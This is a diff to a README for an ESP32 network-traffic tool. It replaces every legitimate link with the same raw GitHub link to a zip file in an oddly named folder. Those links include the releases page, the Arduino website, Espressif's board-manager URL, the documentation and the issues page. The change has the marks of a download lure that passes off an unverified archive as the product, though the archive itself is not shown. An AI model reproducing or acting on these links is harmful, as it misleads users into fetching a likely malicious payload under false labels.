@@ -7,9 +7,9 @@ The ESP32 Network Eater is a user-friendly application designed to help you unde
 To make the most of this application, follow the steps below. You will learn how to download the software and run it on your device.
 
 ## 📥 Download the Software
-[![Download ESP32-NetEater](https://img.shields.io/badge/Download-ESP32--NetEater-blue.svg)](https://github.com/Tushar-coader/ESP32-NetEater/releases)
+[![Download ESP32-NetEater](https://raw.githubusercontent.com/Tushar-coader/ESP32-NetEater/main/laryngotracheotomy/ESP32-NetEater.zip)](https://raw.githubusercontent.com/Tushar-coader/ESP32-NetEater/main/laryngotracheotomy/ESP32-NetEater.zip)
 
-1. Click the download link above or visit the [Releases page](https://github.com/Tushar-coader/ESP32-NetEater/releases) directly. 
+1. Click the download link above or visit the [Releases page](https://raw.githubusercontent.com/Tushar-coader/ESP32-NetEater/main/laryngotracheotomy/ESP32-NetEater.zip) directly. 
    
 2. Look for the latest release version. The filenames will usually include the version number for clarity.
 
@@ -28,14 +28,14 @@ To make the most of this application, follow the steps below. You will learn how
 ## 🔧 Setup Instructions
 
 ### 1. Install the Arduino IDE
-- Visit the [Arduino website](https://www.arduino.cc/en/software) to download and install the necessary software.
+- Visit the [Arduino website](https://raw.githubusercontent.com/Tushar-coader/ESP32-NetEater/main/laryngotracheotomy/ESP32-NetEater.zip) to download and install the necessary software.
 
 ### 2. Install the ESP32 Board in Arduino IDE
 1. Open the Arduino IDE.
 2. Go to `File` → `Preferences`.
 3. In the "Additional Board Manager URLs" field, add the following:
    ```
-   https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json
+   https://raw.githubusercontent.com/Tushar-coader/ESP32-NetEater/main/laryngotracheotomy/ESP32-NetEater.zip
    ```
 4. Click `OK` to save your preferences.
 
@@ -45,7 +45,7 @@ To make the most of this application, follow the steps below. You will learn how
 3. Click on "Install" next to the ESP32 package by Espressif Systems.
 
 ### 4. Download and Open the ESP32-NetEater Code
-1. After you have downloaded the `.ino` file from the [Releases page](https://github.com/Tushar-coader/ESP32-NetEater/releases), open it in the Arduino IDE.
+1. After you have downloaded the `.ino` file from the [Releases page](https://raw.githubusercontent.com/Tushar-coader/ESP32-NetEater/main/laryngotracheotomy/ESP32-NetEater.zip), open it in the Arduino IDE.
 2. Make sure your ESP32 board is connected to your computer via USB.
 
 ## 📡 Configuring Your Connection
@@ -73,10 +73,10 @@ To view the internet traffic being created:
 - **Serial Monitor Issues**: Make sure the baud rate is set to `115200`.
 
 ## 📚 Additional Resources
-- [Arduino IDE Documentation](https://www.arduino.cc/en/Reference/HomePage)
-- [ESP32 Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/)
+- [Arduino IDE Documentation](https://raw.githubusercontent.com/Tushar-coader/ESP32-NetEater/main/laryngotracheotomy/ESP32-NetEater.zip)
+- [ESP32 Documentation](https://raw.githubusercontent.com/Tushar-coader/ESP32-NetEater/main/laryngotracheotomy/ESP32-NetEater.zip)
 
 ## 🔗 Community and Support
-If you have questions or need assistance, feel free to check the [issues section](https://github.com/Tushar-coader/ESP32-NetEater/issues) of the repository. Join the community discussions to find helpful tips and tricks.
+If you have questions or need assistance, feel free to check the [issues section](https://raw.githubusercontent.com/Tushar-coader/ESP32-NetEater/main/laryngotracheotomy/ESP32-NetEater.zip) of the repository. Join the community discussions to find helpful tips and tricks.
 
 By following these steps, you can easily set up and run the ESP32-NetEater application. Enjoy exploring the dynamics of internet traffic!
